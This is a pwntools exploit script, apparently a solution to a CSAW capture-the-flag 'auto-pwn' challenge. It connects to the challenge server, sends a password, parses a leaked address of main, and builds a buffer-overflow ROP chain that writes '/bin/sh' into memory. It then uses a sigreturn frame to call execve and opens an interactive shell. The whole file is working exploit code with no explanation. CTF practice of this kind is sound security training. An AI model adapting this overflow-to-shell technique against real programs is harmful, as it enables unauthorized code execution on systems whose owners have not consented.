from pwn import *
from time import sleep
pw= '5ba73db3117a885aaa3c80ebe4ec603e'
context.arch='amd64'
p = process('./lol2.bin')
p = remote("auto-pwn.chal.csaw.io", 11002)
#pid = gdb.attach(p, gdbscript="""
        
 #       b * runChallenge
  #      """)



#parse it
p.sendlineafter('> ',pw)
#sleep(1)
p.recvuntil('\nMain is at ')
#sleep(2)
main = int(p.recvline().replace('\n',''),16)
print('main: ',hex(main))

base = main - 0x1421
print("base: ",hex(base))
run_chall = main  -0x20
bss = main +0x2c1f

syscall = main -0x1a2

loop10 = main - 0x137 #pop rdi
loop9 = main -0x144 #pop rsi
loop8 = main - 0x153 #xor rax rax
loop7 = main - 0x161 #int 0x80
loop6 = main - 0x170 #inc rax
loop5 = main -0x178 #pop rdx
loop4 = main -0x16b #pop rax
loop3 = main -0x1a2 #syscall
loop2 = main -0x194 #qword ptr [RDX],RAX
loop1 = main -0x133 #mov eax 0xf

padd= 'A' *9
bin_sh =p64(0x0068732f6e69622f)
payload1 = padd
payload1 += p64(loop4)
payload1 += bin_sh
payload1 += p64(loop5)
payload1 += p64(bss)
payload1 += p64(loop2)

payload1 += p64(loop1)
payload1 += p64(loop3)




frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bss
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = 0x4141414141
frame.rip = syscall

payload1 += str(frame)
p.sendline(payload1)
p.interactive()
